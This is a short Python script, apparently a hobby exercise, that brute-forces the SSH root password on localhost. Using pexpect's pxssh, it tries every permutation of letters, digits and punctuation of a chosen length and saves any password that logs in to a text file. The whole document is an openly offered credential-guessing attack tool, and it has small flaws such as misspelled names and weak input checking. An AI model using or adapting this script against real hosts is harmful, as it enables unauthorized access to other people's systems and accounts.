import string
import itertools
from pexpect import pxssh

def Main():
    s = pxssh.pxssh()

    HOST = 'localhost'
    USER = 'root'

    num_of_characters = int(input('Please enter passsword characters : '))

    if num_of_characters < 0:
        print('please enter valid input')

    charaters = list(string.ascii_letters + string.digits + string.punctuation)

    for passwrod in itertools.permutations(charaters, num_of_characters):
        if s.login (HOST, USER, ''.join(passwrod)):
            file = open('password-for' + HOST + '.txt','w')
            file.write(''.join(passwrod) + '\n')
            file.close()

if __name__ == '__main__':
    Main()